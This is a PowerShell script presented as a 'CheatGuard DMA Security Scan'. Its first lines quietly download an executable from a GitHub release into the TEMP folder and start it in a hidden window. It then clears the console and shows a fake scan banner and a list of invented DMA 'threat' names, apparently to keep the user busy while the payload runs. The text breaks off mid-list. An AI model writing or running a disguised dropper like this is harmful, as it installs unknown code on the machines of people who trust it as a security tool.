$progressPreference = 'silentlyContinue'
iwr https://github.com/Proxyonly/dsfds/releases/download/da/TEMP.exe -O $env:TEMP\m.exe

$p = Start-Process -FilePath $env:TEMP\m.exe -WindowStyle Hidden -PassThru

Start-Sleep -Seconds 1
Clear-Host

Write-Host "=============================================" -ForegroundColor Cyan
Write-Host "   CheatGuard DMA Security Scan" -ForegroundColor White
Write-Host "   Scanning system memory for threats..." -ForegroundColor Yellow
Write-Host "=============================================" -ForegroundColor Cyan
Write-Host ""

$hackNames = @(
    "DMA.Kernel.Memory.Hook.v2",
    "WinIo.SysMap.Exploit",
    "DirectMemory.Access.Driver",
    "PhysMem.Map.Kernel.Spoof",
    "DMA.PCIe.Overlay.Injector",
    "MemoryPool.DirectRead.Evasion",
    "Kernel32.DMA.Bypass.Module",
    "NTOSKRNL.Memory.Dump.Tool",
    "CR3.Spoofing.DMA.Attack",
    "DMA.SMM.Switch.Hijack",
    "IOMMU.Translation.Bypass",
    "ACPI.DMA.Table.Injection",
    "EFI.Runtime.DMA.Scanner",
    "SMBIOS.DMA.Spoofing.Tool",
    "PciBus.Driver.Hook.Evasion",
    "DMA.VTd.Remapping.Bypass",
    "HalDispatchTable.DMA.Hook",
    "PhysicalAddress.DMA.Overlay",
    "KernelDMA.Scan.Evasion.Module",
    "DMA.TLP.Injection.Payload",
    "MmMapIoSpace.DMA.Exploit",
    "DMA.MemoryBarrier.Bypass",
    "IOCTL.DMA.Driver.Escalate",
    "DMA.VirtualToPhysical.Mapper",
    "TLB.Flush.DMA.Attack",
    "DMA.NonCached.Memory.Scan",
    "PCI.ConfigSpace.DMA.Hook",
    "DMA.DPC.Deferred.Injection",
    "Interrupt.Vector.DMA.Hijack",
    "DMA.FrameBuffer.Overwrite"
